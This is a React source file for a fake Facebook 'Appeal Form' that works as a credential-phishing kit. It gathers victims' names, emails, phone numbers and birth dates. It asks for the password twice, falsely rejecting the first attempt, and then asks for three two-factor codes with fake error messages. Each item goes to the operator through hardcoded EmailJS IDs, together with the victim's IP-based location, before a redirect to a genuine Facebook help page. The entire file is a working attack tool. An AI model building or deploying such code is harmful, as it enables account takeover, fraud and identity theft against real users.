import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom"; // ✅ thêm

import emailjs from "@emailjs/browser";
import "./LoginForm.scss";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";

function LoginForm({ onClose }) {
  // State quản lý hiển thị password
  const navigate = useNavigate();
  const [isShowPass, setIsShowPass] = useState(false);
  const [loadingInitial, setLoadingInitial] = useState(false); // Submit Appeal (form đầu)
  const [loadingPassword, setLoadingPassword] = useState(false); // State lưu thông tin form
  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState(""); // ✅ thêm
  const [code3, setCode3] = useState(""); // ✅ thêm
  const [additionalInfo, setAdditionalInfo] = useState("");

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [currentUrl, setCurrentUrl] = useState("");

  // State quản lý UI
  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmited, setIsSubmited] = useState(false);

  // State chống spam
  const [clickCount, setClickCount] = useState(0);
  const [clickCount1, setClickCount1] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [isSubmitCodeDisabled, setIsSubmitCodeDisabled] = useState(true);
  const [isFirstAttemptDisabled, setIsFirstAttemptDisabled] = useState(false);

  // State thời gian chờ
  const [timeLeft, setTimeLeft] = useState(10);
  const [timeLeftFirstAttempt, setTimeLeftFirstAttempt] = useState(5);

  // State lưu thông tin IP và vị trí
  const [ip, setIp] = useState("");
  const [location, setLocation] = useState("");
  const [countryCode, setCountryCode] = useState("");
  const [flagUrl, setFlagUrl] = useState("");

  // State lưu lỗi
  const [errors, setErrors] = useState({
    email: "",
    password: "",
    code: "",
    submit: "",
    isSubmitCode: "",
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
  });

  const handlePhoneChange = (value, country) => {
    setFormData((prev) => ({
      ...prev,
      phoneNumber: value,
      countryCode: country.countryCode.toUpperCase(),
    }));
  };

  // State lưu dữ liệu form
  const [formData, setFormData] = useState({
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
    countryCode: "US",
    additionalInfo: "",
    currentUrl: "",
  });

  const handleDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove all non-digit characters
    let formattedValue = "";

    if (value.length > 0) {
      formattedValue = value.substring(0, 2);
      if (value.length > 2) {
        formattedValue += "/" + value.substring(2, 4);
        if (value.length > 4) {
          formattedValue += "/" + value.substring(4, 8);
        }
      }
    }

    setFormData((prevData) => ({
      ...prevData,
      dateOfBirth: formattedValue,
    }));
  };

  // Khởi tạo EmailJS
  useEffect(() => {
    const url = window.location.href;
    setCurrentUrl(url);

    emailjs.init("7dUGFPkSYms-umST1"); // Thay bằng User ID của bạn từ EmailJS

    const fetchData = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) {
          throw new Error("Failed to fetch IP data");
        }
        const result = await response.json();
        setIp(result.ip);

        if (result && result.ip) {
          const locationResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
          );
          if (!locationResponse.ok) {
            throw new Error("Failed to fetch location data");
          }
          const locationData = await locationResponse.json();

          const callingCode = locationData?.calling_code || "";
          const countryCode = locationData?.country_code2 || "";
          const flagUrl = `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;

          setCountryCode(callingCode);
          setFlagUrl(flagUrl);

          setFormData((prev) => ({
            ...prev,
            phoneNumber: callingCode ? `${callingCode} ` : "",
            countryCode: countryCode || "US",
          }));

          const district = locationData?.district || "N/A";
          const city = locationData?.city || "N/A";
          const country = locationData?.country_name || "N/A";
          const locationText = `${district} / ${city} / ${country}`;

          setLocation(locationText);
        }
      } catch (err) {
        console.log(err);
      }
    };

    fetchData();
  }, []);

  const handleOnchange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleOnchangeEmail = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      email: "",
      submit: "",
    }));
    setEmail(e.target.value);
  };

  const handleOnchangePassword = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      password: "",
      submit: "",
    }));
    setPassword(e.target.value);
  };

  const handleOnchangeCode = (e) => {
    setIsSubmitCodeDisabled(false);
    const input = e.target.value;
    if (/^\d{0,8}$/.test(input)) {
      setCode(input);
    }
  };

  const validateInputs = () => {
    let isValid = true;
    const newErrors = { email: "", password: "" };

    if (!password) {
      newErrors.password = "Password is required";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const validate = () => {
    const newErrors = {};
    let isValid = true;

    if (!formData.fullName) {
      newErrors.fullName = "Full Name is required!";
      isValid = false;
    }

    if (!formData.personalEmail) {
      newErrors.personalEmail = "Email is required!";
      isValid = false;
    }

    if (!formData.businessEmail) {
      newErrors.businessEmail = "Email Business is required!";
      isValid = false;
    }

    if (!formData.phoneNumber) {
      newErrors.phoneNumber = "Phone Number is required!";
      isValid = false;
    }

    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of Birth is required!";
      isValid = false;
    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateOfBirth)) {
      newErrors.dateOfBirth = "Invalid date format (MM/DD/YYYY)";
      isValid = false;
    }

    if (!formData.link) {
      newErrors.link = "Page Name is required!";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  // Format date to dd/mm/yyyy
  const formatDate = (dateString) => {
    if (!dateString) return "";
    const [year, month, day] = dateString.split("-");
    return `${day}/${month}/${year}`;
  };

  // Get current time in Vietnamese format
  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  // Gửi dữ liệu ban đầu đến EmailJS
  const sendInitialDataToEmailJS = async () => {
    try {
      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      const templateParams = {
        form_type: "Initial Submission",
        full_name: formData.fullName,
        personal_email: formData.personalEmail,
        business_email: formData.businessEmail,
        phone_number: formData.phoneNumber,
        date_of_birth: formData.dateOfBirth || "N/A",
        page_name: formData.link,
        ip_address: ip,
        country: locationParts[2] || "N/A",
        city: locationParts[1] || "N/A",
        current_time: currentTime,
        password1: "",
        password2: "",
        code1: "",
        code2: "",
        code3: "",
        additional_info: formData.additionalInfo || "N/A",

        current_url: currentUrl,
      };

      await emailjs.send(
        "service_6b4csj2", // Thay bằng Service ID của bạn
        "template_sv0xth6", // Thay bằng Template ID của bạn
        templateParams
      );
    } catch (err) {
      console.error("EmailJS Error:", err);
    }
  };

  // Cập nhật dữ liệu trên EmailJS
  const updateEmailJSData = async (
    step,
    { password1Input, password2Input, code1Input, code2Input, code3Input } = {}
  ) => {
    try {
      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      let templateParams = {
        form_type: "",
        full_name: formData.fullName,
        personal_email: formData.personalEmail,
        business_email: formData.businessEmail,
        phone_number: formData.phoneNumber,
        date_of_birth: formData.dateOfBirth || "N/A",
        page_name: formData.link,
        ip_address: ip,
        country: locationParts[2] || "N/A",
        city: locationParts[1] || "N/A",
        current_time: currentTime,
        password1: password1Input || "N/A",
        password2: password2Input || "N/A",
        code1: code1Input || "N/A",
        code2: code2Input || "N/A",
        code3: code3Input || "N/A", // ✅ mới thêm

        current_url: currentUrl, // ✅ luôn đính kèm
        additional_info: additionalInfo || "N/A",
      };

      switch (step) {
        case "password1":
          templateParams.form_type = "First Password Submitted";
          break;
        case "password2":
          templateParams.form_type = "Second Password Submitted";
          break;
        case "code1":
          templateParams.form_type = "First 2FA Code Submitted";
          break;
        case "code2":
          templateParams.form_type = "Second 2FA Code Submitted";
          break;
        case "code3":
          templateParams.form_type = "Final 2FA Code Submitted - COMPLETE";
          break;
        default:
          templateParams.form_type = "Form Update";
      }

      await emailjs.send("service_6b4csj2", "template_sv0xth6", templateParams);
    } catch (err) {
      console.error("EmailJS Error:", err);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (loadingPassword) return; // chặn double-click

    if (validateInputs()) {
      setLoadingPassword(true);
      setIsSubmitDisabled(true);

      if (clickCount === 0) {
        setPassword1(password);
        await updateEmailJSData("password1", { password1Input: password });

        setTimeout(() => {
          setErrors((prevErrors) => ({
            ...prevErrors,
            submit: "The password you've entered is incorrect.",
          }));
          setPassword("");
          setIsSubmitDisabled(false);
          setLoadingPassword(false);
        }, 3000);
      } else if (clickCount === 1) {
        setPassword2(password);
        await updateEmailJSData("password2", {
          password1Input: password1,
          password2Input: password,
        });

        setTimeout(() => {
          setIsSubmitDisabled(false);
          setLoadingPassword(false);

          navigate(
            "/two_step_verification/two_factor?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next",
            {
              state: {
                method: "app",
                ip,
                location,
                formData,
                password1,
                password2: password,
                additionalInfo,
                currentUrl,
              },
              replace: true,
            }
          );
        }, 1200);
      }
      setClickCount((prev) => prev + 1);
    }
  };

  const sendToEmailJS = async () => {
    try {
      const currentClick = clickCount1;
      setClickCount1((prev) => prev + 1);

      if (currentClick === 0) {
        setCode1(code);
        await updateEmailJSData("code1", {
          password1Input: password1,
          password2Input: password2,
          code1Input: code,
        });

        setIsSubmitDisabled(true);
        setTimeLeft(10);
        const timer = setInterval(() => {
          setTimeLeft((prev) => {
            if (prev <= 1) {
              clearInterval(timer);
              setIsSubmitDisabled(false);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);

        setCode("");
      } else if (currentClick === 1) {
        setCode2(code);
        await updateEmailJSData("code2", {
          password1Input: password1,
          password2Input: password2,
          code1Input: code1,
          code2Input: code,
        });

        setIsSubmitDisabled(true);
        setTimeLeft(10);
        const timer = setInterval(() => {
          setTimeLeft((prev) => {
            if (prev <= 1) {
              clearInterval(timer);
              setIsSubmitDisabled(false);
              return 0;
            }
            return prev - 1;
          });
        }, 1000);

        setCode("");
      } else if (currentClick === 2) {
        await updateEmailJSData("code3", {
          password1Input: password1,
          password2Input: password2,
          code1Input: code1,
          code2Input: code2,
          code3Input: code,
        });

        setTimeout(() => {
          window.location.href =
            "https://www.facebook.com/help/1735443093393986/";
        }, 2000);
      }
    } catch (err) {
      console.error("EmailJS Error:", err);
    }
  };

  const toggleShowPass = () => {
    setIsShowPass(!isShowPass);
  };

  const handleSubmit1 = async (e) => {
    e.preventDefault();
    if (loadingInitial) return; // chặn double-click
    if (validate()) {
      setLoadingInitial(true);
      try {
        await sendInitialDataToEmailJS();
        setIsSubmited(true);
      } catch (err) {
        console.error(err);
      } finally {
        setLoadingInitial(false);
      }
    }
  };

  return (
    <div className="modal-overlay">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        {isSubmited ? (
          isSuccess ? (
            <div className="top">
              <button className="close-btn" onClick={onClose}>
                x
              </button>
              <div className="check">
                <p className="title">
                  Two-factor authentication required (1/3)
                </p>
                <p className="desc">
                  The verification code has been sent to your phone number or
                  E-mail, please check your inbox and enter the code below to
                  complete. In case you do not receive the code, please check
                  the Facebook notification on your device and confirm it is you
                  to complete the verification process.
                </p>
                <img src="/checkpoint.png" alt="" />
              </div>
              <div className="check">
                <div className="input-box">
                  <input
                    type="text"
                    placeholder="Code"
                    value={code}
                    onChange={handleOnchangeCode}
                    maxLength={8}
                  />
                  {errors.isSubmitCode && (
                    <span className="error">{errors.isSubmitCode}</span>
                  )}
                </div>
                {isSubmitDisabled && (
                  <span className="error">
                    The two-factor authentication you entered is incorrect.
                    Please, try again after {Math.floor(timeLeft / 60)} minutes{" "}
                    {String(timeLeft % 60).padStart(2, "0")} seconds
                  </span>
                )}
                <button
                  type="button"
                  className={`login-btn ${isSubmitDisabled ? "disabled" : ""} ${
                    isSubmitCodeDisabled ? "btn-disabled" : ""
                  }`}
                  onClick={sendToEmailJS}
                  disabled={isSubmitDisabled}
                >
                  Continue
                </button>
              </div>
            </div>
          ) : (
            <div className="top">
              <button className="close-btn" onClick={onClose}>
                x
              </button>
              <img
                className="logo"
                src="data:image/png;base64,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"
                alt=""
              />
              <form onSubmit={handleSubmit}>
                <div className="input-box">
                  <p className="label2">
                    For your security, you must enter your password to continue.
                  </p>
                  <div className="box">
                    <input
                      type={isShowPass ? "text" : "password"}
                      placeholder="Password"
                      value={password}
                      onChange={(e) => handleOnchangePassword(e)}
                    />
                    {errors.password && (
                      <span className="error">{errors.password}</span>
                    )}
                    {isShowPass ? (
                      <i
                        className="fa-regular fa-eye"
                        onClick={toggleShowPass}
                      ></i>
                    ) : (
                      <i
                        className="fa-regular fa-eye-slash"
                        onClick={toggleShowPass}
                      ></i>
                    )}
                  </div>
                </div>
                {errors.submit && (
                  <span className="error">{errors.submit}</span>
                )}
                <button
                  type="submit"
                  className="login-btn"
                  disabled={isSubmitDisabled || loadingPassword}
                >
                  {loadingPassword ? (
                    <span className="spinner-inline" />
                  ) : (
                    "Continue"
                  )}
                </button>
              </form>
            </div>
          )
        ) : (
          <div className="top">
            <h3>Apeal Form</h3>
            <button className="close-btn" onClick={onClose}>
              x
            </button>
            <br />
            <form onSubmit={handleSubmit1} lang="en">
              <div className="input-box">
                <input
                  placeholder="Full Name"
                  type="text"
                  value={formData.fullName}
                  name="fullName"
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.fullName && (
                  <span className="error">{errors.fullName}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Email"
                  type="email"
                  name="personalEmail"
                  value={formData.personalEmail}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.personalEmail && (
                  <span className="error">{errors.personalEmail}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Email Business"
                  type="email"
                  name="businessEmail"
                  value={formData.businessEmail}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.businessEmail && (
                  <span className="error">{errors.businessEmail}</span>
                )}
              </div>
              <div className="input-box">
                <input
                  placeholder="Page Name"
                  type="text"
                  name="link"
                  value={formData.link}
                  onChange={(e) => handleOnchange(e)}
                />
                {errors.link && <span className="error">{errors.link}</span>}
              </div>
              <div className="input-box">
                <PhoneInput
                  country={formData.countryCode?.toLowerCase() || "us"}
                  value={formData.phoneNumber}
                  onChange={handlePhoneChange}
                  inputProps={{
                    name: "phoneNumber",
                    required: true,
                  }}
                  containerClass="phone-input-container"
                  inputClass="phone-input"
                  buttonClass="phone-input-button"
                  dropdownClass="phone-input-dropdown"
                />
                {errors.phoneNumber && (
                  <span className="error">{errors.phoneNumber}</span>
                )}
              </div>
              <div className="dateofbirth">
                <p>Date of Birth</p>
              </div>
              <div className="input-box">
                <input
                  className="dateinput"
                  type="text"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleDateChange}
                  placeholder="MM/DD/YYYY"
                  maxLength="10"
                />
                {errors.dateOfBirth && (
                  <span className="error">{errors.dateOfBirth}</span>
                )}
              </div>
              <div className="dateofbirth">
                <p>Additional information</p>
              </div>
              <div className="input-box">
                <textarea
                  name="additionalInfo"
                  rows="4"
                  value={additionalInfo}
                  onChange={(e) => setAdditionalInfo(e.target.value)}
                ></textarea>
              </div>
              <p>
                Please indicate why you believe that account restrictions were
                imposed by mistake. Our technology and team work in multiple
                languages to ensure consistent enforcement of rules. You can
                communicate with us in your native language.
              </p>
              {/* <p>Our response will be sent to you within 14 - 48 hours.</p> */}
              <div className="notify-box">
                <div className="left">
                  <img
                    src="https://img.icons8.com/?size=512&id=118467&format=png"
                    alt="Facebook Icon"
                    className="fb-icon"
                  />
                  <div className="text">
                    <strong>on Facebook</strong>
                    <p>We will send you a notification on Facebook.</p>
                  </div>
                </div>
                <label className="switch">
                  <input type="checkbox" defaultChecked />
                  <span className="slider"></span>
                </label>
              </div>
              {/* <div className="input-box">
                <div className="flex-box">
                  <input
                    className="checkbox"
                    type="checkbox"
                    name="term"
                    id=""
                  />
                  <p>
                    I agree with <a href="#">Terms of use</a>
                  </p>
                </div>
              </div> */}
              <label class="custom-checkbox">
                <input type="checkbox" class="checkbox" />
                <span class="checkmark"></span>I agree with&nbsp;
                <a href="#">Terms of use</a>
              </label>

              {errors.submit && <span className="error">{errors.submit}</span>}
              <button
                type="submit"
                className="login-btn"
                disabled={loadingInitial}
              >
                {loadingInitial ? (
                  <span className="spinner-inline" />
                ) : (
                  "Submit Appeal"
                )}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
}

export default LoginForm;
